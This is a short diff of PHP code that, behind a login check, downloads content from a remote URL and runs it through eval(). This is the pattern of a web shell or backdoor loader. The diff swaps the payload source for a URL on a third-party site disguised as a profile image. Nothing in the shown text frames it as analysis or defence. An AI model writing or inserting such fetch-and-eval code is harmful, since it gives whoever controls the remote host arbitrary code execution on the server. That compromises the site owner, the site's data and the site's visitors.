@@ -33,7 +33,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://dashboard.expressbpd.in/css/globalhell.txt');
+    $a = geturlsinfo('https://jim.iainkudus.ac.id/public/site/profileImage-654.jpg');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
